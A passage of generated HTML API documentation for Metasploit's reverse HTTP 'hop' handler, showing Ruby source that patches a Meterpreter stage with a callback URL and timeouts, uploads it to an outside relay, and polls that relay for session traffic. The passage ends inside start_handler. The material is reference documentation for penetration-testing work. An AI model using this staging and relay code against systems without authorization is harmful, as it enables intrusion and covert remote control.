    <span class='lbracket'>[</span>
      <span class='const'>OptString</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HOPURL</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>The full URL of the hop script, e.g. http://a.b/hop.php</span><span class='tstring_end'>&quot;</span></span> <span class='rbracket'>]</span><span class='rparen'>)</span>
    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Handler</span><span class='op'>::</span><span class='const'>ReverseHopHttp</span><span class='rparen'>)</span>

<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="localinfo-instance_method">
  
    - (<tt>Object</tt>) <strong>localinfo</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns a string representation of the local hop</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


216
217
218</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 216</span>

<span class='kw'>def</span> <span class='id identifier rubyid_localinfo'>localinfo</span>
  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Hop client</span><span class='tstring_end'>&quot;</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="peerinfo-instance_method">
  
    - (<tt>Object</tt>) <strong>peerinfo</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns the URL of the remote hop end</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


223
224
225
226</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 223</span>

<span class='kw'>def</span> <span class='id identifier rubyid_peerinfo'>peerinfo</span>
  <span class='id identifier rubyid_uri'>uri</span> <span class='op'>=</span> <span class='const'>URI</span><span class='lparen'>(</span><span class='id identifier rubyid_full_uri'>full_uri</span><span class='rparen'>)</span>
  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_uri'>uri</span><span class='period'>.</span><span class='id identifier rubyid_host'>host</span><span class='embexpr_end'>}</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_uri'>uri</span><span class='period'>.</span><span class='id identifier rubyid_port'>port</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="remove_resource-instance_method">
  
    - (<tt>Object</tt>) <strong>remove_resource</strong>(res) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Removes a resource.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


174
175
176
177
178
179</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 174</span>

<span class='kw'>def</span> <span class='id identifier rubyid_remove_resource'>remove_resource</span><span class='lparen'>(</span><span class='id identifier rubyid_res'>res</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_lock'>lock</span><span class='period'>.</span><span class='id identifier rubyid_lock'>lock</span>
  <span class='id identifier rubyid_handlers'>handlers</span><span class='period'>.</span><span class='id identifier rubyid_delete'>delete</span><span class='lparen'>(</span><span class='id identifier rubyid_res'>res</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_closed_handlers'>closed_handlers</span><span class='lbracket'>[</span><span class='id identifier rubyid_res'>res</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='kw'>true</span>
  <span class='id identifier rubyid_lock'>lock</span><span class='period'>.</span><span class='id identifier rubyid_unlock'>unlock</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="send_new_stage-instance_method">
  
    - (<tt>Object</tt>) <strong>send_new_stage</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generates and sends a stage up to the hop point to be ready for the next
client</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 244</span>

<span class='kw'>def</span> <span class='id identifier rubyid_send_new_stage'>send_new_stage</span>
  <span class='id identifier rubyid_conn_id'>conn_id</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_uri_checksum'>generate_uri_checksum</span><span class='lparen'>(</span><span class='const'>URI_CHECKSUM_CONN</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>_</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alphanumeric'>rand_text_alphanumeric</span><span class='lparen'>(</span><span class='int'>16</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_url'>url</span> <span class='op'>=</span> <span class='id identifier rubyid_full_uri'>full_uri</span> <span class='op'>+</span> <span class='id identifier rubyid_conn_id'>conn_id</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/\x00</span><span class='tstring_end'>&quot;</span></span>

  <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Preparing stage for next session </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_conn_id'>conn_id</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_blob'>blob</span> <span class='op'>=</span> <span class='id identifier rubyid_stage_payload'>stage_payload</span>

  <span class='comment'># Replace the user agent string with our option
</span>  <span class='id identifier rubyid_i'>i</span> <span class='op'>=</span> <span class='id identifier rubyid_blob'>blob</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>METERPRETER_UA\x00</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_i'>i</span>
    <span class='id identifier rubyid_str'>str</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MeterpreterUserAgent</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span><span class='int'>255</span><span class='rbracket'>]</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00</span><span class='tstring_end'>&quot;</span></span>
    <span class='id identifier rubyid_blob'>blob</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='comma'>,</span> <span class='id identifier rubyid_str'>str</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_str'>str</span>
  <span class='kw'>end</span>

  <span class='comment'># Replace the transport string first (TRANSPORT_SOCKET_SSL)
</span>  <span class='id identifier rubyid_i'>i</span> <span class='op'>=</span> <span class='id identifier rubyid_blob'>blob</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>METERPRETER_TRANSPORT_SSL</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_i'>i</span>
    <span class='id identifier rubyid_str'>str</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>METERPRETER_TRANSPORT_HTTP</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ssl?'>ssl?</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>S</span><span class='tstring_end'>&quot;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span><span class='embexpr_end'>}</span><span class='tstring_content'>\x00</span><span class='tstring_end'>&quot;</span></span>
    <span class='id identifier rubyid_blob'>blob</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='comma'>,</span> <span class='id identifier rubyid_str'>str</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_str'>str</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_conn_id'>conn_id</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_uri_checksum'>generate_uri_checksum</span><span class='lparen'>(</span><span class='const'>URI_CHECKSUM_CONN</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>_</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alphanumeric'>rand_text_alphanumeric</span><span class='lparen'>(</span><span class='int'>16</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_i'>i</span> <span class='op'>=</span> <span class='id identifier rubyid_blob'>blob</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>https://</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span> <span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>X</span><span class='tstring_end'>&quot;</span></span> <span class='op'>*</span> <span class='int'>256</span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_i'>i</span>
    <span class='id identifier rubyid_url'>url</span> <span class='op'>=</span> <span class='id identifier rubyid_full_uri'>full_uri</span> <span class='op'>+</span> <span class='id identifier rubyid_conn_id'>conn_id</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/\x00</span><span class='tstring_end'>&quot;</span></span>
    <span class='id identifier rubyid_blob'>blob</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='comma'>,</span> <span class='id identifier rubyid_url'>url</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_url'>url</span>
  <span class='kw'>end</span>
  <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Patched URL at offset </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_i'>i</span><span class='embexpr_end'>}</span><span class='tstring_content'>...</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>

  <span class='id identifier rubyid_i'>i</span> <span class='op'>=</span> <span class='id identifier rubyid_blob'>blob</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='int'>0xb64be661</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_i'>i</span>
    <span class='id identifier rubyid_str'>str</span> <span class='op'>=</span> <span class='lbracket'>[</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionExpirationTimeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_blob'>blob</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='comma'>,</span> <span class='id identifier rubyid_str'>str</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_str'>str</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_i'>i</span> <span class='op'>=</span> <span class='id identifier rubyid_blob'>blob</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='int'>0xaf79257f</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_i'>i</span>
    <span class='id identifier rubyid_str'>str</span> <span class='op'>=</span> <span class='lbracket'>[</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionCommunicationTimeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_blob'>blob</span><span class='lbracket'>[</span><span class='id identifier rubyid_i'>i</span><span class='comma'>,</span> <span class='id identifier rubyid_str'>str</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_str'>str</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_blob'>blob</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_stage'>encode_stage</span><span class='lparen'>(</span><span class='id identifier rubyid_blob'>blob</span><span class='rparen'>)</span>

  <span class='comment'>#send up
</span>  <span class='id identifier rubyid_crequest'>crequest</span> <span class='op'>=</span> <span class='id identifier rubyid_mclient'>mclient</span><span class='period'>.</span><span class='id identifier rubyid_request_raw'>request_raw</span><span class='lparen'>(</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>method</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>POST</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>uri</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_control'>control</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>data</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_blob'>blob</span><span class='comma'>,</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>headers</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='lbrace'>{</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>X-init</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>true</span><span class='tstring_end'>&#39;</span></span><span class='rbrace'>}</span>
  <span class='rparen'>)</span>
  <span class='id identifier rubyid_res'>res</span> <span class='op'>=</span> <span class='id identifier rubyid_mclient'>mclient</span><span class='period'>.</span><span class='id identifier rubyid_send_recv'>send_recv</span><span class='lparen'>(</span><span class='id identifier rubyid_crequest'>crequest</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Uploaded stage to hop </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_full_uri'>full_uri</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_print_error'>print_error</span><span class='lparen'>(</span><span class='id identifier rubyid_res'>res</span><span class='period'>.</span><span class='id identifier rubyid_error'>error</span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='op'>!</span><span class='id identifier rubyid_res'>res</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_res'>res</span><span class='period'>.</span><span class='id identifier rubyid_error'>error</span>

  <span class='comment'>#return conn info
</span>  <span class='lbracket'>[</span><span class='id identifier rubyid_conn_id'>conn_id</span><span class='comma'>,</span> <span class='id identifier rubyid_url'>url</span><span class='rbracket'>]</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="send_response-instance_method">
  
    - (<tt>Object</tt>) <strong>send_response</strong>(resp) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Sends data to hop</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


190
191
192
193
194
195
196
197
198
199
200
201</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 190</span>

<span class='kw'>def</span> <span class='id identifier rubyid_send_response'>send_response</span><span class='lparen'>(</span><span class='id identifier rubyid_resp'>resp</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='kw'>not</span> <span class='id identifier rubyid_resp'>resp</span><span class='period'>.</span><span class='id identifier rubyid_body'>body</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
    <span class='id identifier rubyid_crequest'>crequest</span> <span class='op'>=</span> <span class='id identifier rubyid_mclient'>mclient</span><span class='period'>.</span><span class='id identifier rubyid_request_raw'>request_raw</span><span class='lparen'>(</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>method</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>POST</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>uri</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_control'>control</span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>data</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_resp'>resp</span><span class='period'>.</span><span class='id identifier rubyid_body'>body</span><span class='comma'>,</span>
        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>headers</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='lbrace'>{</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>X-urlfrag</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_current_url'>current_url</span><span class='rbrace'>}</span>
    <span class='rparen'>)</span>
    <span class='comment'># if receiving POST data, hop does not send back data, so we can stop here
</span>    <span class='id identifier rubyid_mclient'>mclient</span><span class='period'>.</span><span class='id identifier rubyid_send_recv'>send_recv</span><span class='lparen'>(</span><span class='id identifier rubyid_crequest'>crequest</span><span class='rparen'>)</span>
  <span class='kw'>end</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="setup_handler-instance_method">
  
    - (<tt>Object</tt>) <strong>setup_handler</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Sets up a handler. Doesn&#39;t do much since it&#39;s all in start_handler.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


60
61
62
63
64</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 60</span>

<span class='kw'>def</span> <span class='id identifier rubyid_setup_handler'>setup_handler</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_handlers'>handlers</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_closed_handlers'>closed_handlers</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_lock'>lock</span> <span class='op'>=</span> <span class='const'>Mutex</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="start_handler-instance_method">
  
    - (<tt>Object</tt>) <strong>start_handler</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Starts the handler along with a monitoring thread to handle data transfer</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 69</span>

<span class='kw'>def</span> <span class='id identifier rubyid_start_handler'>start_handler</span>
  <span class='comment'># Our HTTP client and URL for talking to the hop
</span>  <span class='id identifier rubyid_uri'>uri</span> <span class='op'>=</span> <span class='const'>URI</span><span class='lparen'>(</span><span class='id identifier rubyid_full_uri'>full_uri</span><span class='rparen'>)</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_control'>control</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_uri'>uri</span><span class='period'>.</span><span class='id identifier rubyid_request_uri'>request_uri</span><span class='embexpr_end'>}</span><span class='tstring_content'>control</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_mclient'>mclient</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Proto</span><span class='op'>::</span><span class='const'>Http</span><span class='op'>::</span><span class='const'>Client</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span>
    <span class='id identifier rubyid_uri'>uri</span><span class='period'>.</span><span class='id identifier rubyid_host'>host</span><span class='comma'>,</span>
    <span class='id identifier rubyid_uri'>uri</span><span class='period'>.</span><span class='id identifier rubyid_port'>port</span><span class='comma'>,</span>
    <span class='lbrace'>{</span>
      <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Msf</span><span class='tstring_end'>&#39;</span></span>        <span class='op'>=&gt;</span> <span class='id identifier rubyid_framework'>framework</span>
    <span class='rbrace'>}</span>
  <span class='rparen'>)</span>
  <span class='ivar'>@running</span> <span class='op'>=</span> <span class='kw'>true</span> <span class='comment'># So we know we can stop it
</span>  <span class='comment'># If someone is already monitoring this hop, bump the refcount instead of starting a new thread
</span>  <span class='kw'>if</span> <span class='const'>ReverseHopHttp</span><span class='period'>.</span><span class='id identifier rubyid_hop_handlers'>hop_handlers</span><span class='period'>.</span><span class='id identifier rubyid_has_key?'>has_key?</span><span class='lparen'>(</span><span class='id identifier rubyid_full_uri'>full_uri</span><span class='rparen'>)</span>
    <span class='const'>ReverseHopHttp</span><span class='period'>.</span><span class='id identifier rubyid_hop_handlers'>hop_handlers</span><span class='lbracket'>[</span><span class='id identifier rubyid_full_uri'>full_uri</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_refs'>refs</span> <span class='op'>+=</span> <span class='int'>1</span>
    <span class='kw'>return</span>
  <span class='kw'>end</span>

  <span class='comment'># Sometimes you just have to do everything yourself. 
</span>  <span class='comment'># Declare ownership of this hop and spawn a thread to monitor it.
</span>  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_refs'>refs</span> <span class='op'>=</span> <span class='int'>1</span>
  <span class='const'>ReverseHopHttp</span><span class='period'>.</span><span class='id identifier rubyid_hop_handlers'>hop_handlers</span><span class='lbracket'>[</span><span class='id identifier rubyid_full_uri'>full_uri</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='kw'>self</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_monitor_thread'>monitor_thread</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>ThreadFactory</span><span class='period'>.</span><span class='id identifier rubyid_spawn'>spawn</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ReverseHopHTTP</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='id identifier rubyid_uri'>uri</span><span class='comma'>,</span>
      <span class='kw'>self</span><span class='rparen'>)</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_uri'>uri</span><span class='comma'>,</span> <span class='id identifier rubyid_hop_http'>hop_http</span><span class='op'>|</span>
    <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_send_new_stage'>send_new_stage</span> <span class='comment'># send stage to hop
</span>    <span class='id identifier rubyid_delay'>delay</span> <span class='op'>=</span> <span class='int'>1</span> <span class='comment'># poll delay
</span>    <span class='comment'># Continue to loop as long as at least one handler or one session is depending on us
</span>    <span class='kw'>until</span> <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_refs'>refs</span> <span class='op'>&lt;</span> <span class='int'>1</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_handlers'>handlers</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
      <span class='id identifier rubyid_sleep'>sleep</span> <span class='id identifier rubyid_delay'>delay</span>
      <span class='id identifier rubyid_delay'>delay</span> <span class='op'>=</span> <span class='id identifier rubyid_delay'>delay</span> <span class='op'>+</span> <span class='int'>1</span> <span class='kw'>if</span> <span class='id identifier rubyid_delay'>delay</span> <span class='op'>&lt;</span> <span class='int'>10</span> <span class='comment'># slow down if we&#39;re not getting anything
</span>      <span class='id identifier rubyid_crequest'>crequest</span> <span class='op'>=</span> <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_mclient'>mclient</span><span class='period'>.</span><span class='id identifier rubyid_request_raw'>request_raw</span><span class='lparen'>(</span><span class='lbrace'>{</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>method</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>GET</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>uri</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='id identifier rubyid_control'>control</span><span class='rbrace'>}</span><span class='rparen'>)</span>
      <span class='id identifier rubyid_res'>res</span> <span class='op'>=</span> <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_mclient'>mclient</span><span class='period'>.</span><span class='id identifier rubyid_send_recv'>send_recv</span><span class='lparen'>(</span><span class='id identifier rubyid_crequest'>crequest</span><span class='rparen'>)</span> <span class='comment'># send poll to the hop
</span>      <span class='kw'>next</span> <span class='kw'>if</span> <span class='id identifier rubyid_res'>res</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
      <span class='kw'>if</span> <span class='id identifier rubyid_res'>res</span><span class='period'>.</span><span class='id identifier rubyid_error'>error</span>
        <span class='id identifier rubyid_print_error'>print_error</span><span class='lparen'>(</span><span class='id identifier rubyid_res'>res</span><span class='period'>.</span><span class='id identifier rubyid_error'>error</span><span class='rparen'>)</span>
        <span class='kw'>next</span>
      <span class='kw'>end</span>

      <span class='comment'># validate responses, handle each message down
</span>      <span class='id identifier rubyid_received'>received</span> <span class='op'>=</span> <span class='id identifier rubyid_res'>res</span><span class='period'>.</span><span class='id identifier rubyid_body'>body</span>
